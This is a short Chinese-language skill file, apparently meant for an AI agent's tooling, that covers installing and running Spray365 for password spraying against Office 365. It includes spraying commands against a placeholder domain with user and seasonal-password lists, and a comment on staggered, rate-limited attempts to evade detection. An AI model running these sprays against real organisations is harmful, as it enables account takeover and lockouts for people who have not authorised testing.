---
name: spray365-o365
description: 渗透工具 skill:Spray365 的安装、参数速查与攻击场景 playbook。当任务涉及 暴力破解与口令喷射 需要调用 Spray365 时使用。
when-to-use: 渗透工具 skill:Spray365 的安装、参数速查与攻击场景 playbook。当任务涉及 暴力破解与口令喷射 需要调用 Spray365 时使用。
---

# Spray365

- 攻击大类:C28 暴力破解与口令喷射
- 上游仓库:https://github.com/MarkoH17/Spray365
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install spray365
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `spray365 -d corp.com -u users.txt -p pass.txt` | O365 喷洒 |
| `-d d -u u.txt -p p.txt -a` | 自适应 |
| `-o out.txt` | 输出 |

## 攻击场景 Playbook

### O365 智能喷洒

```bash
spray365 -d corp.com -u emails.txt -p seasons.txt
# 错峰+限速规避
```

## 注意事项

Marko H 出品,O365 密码喷洒。
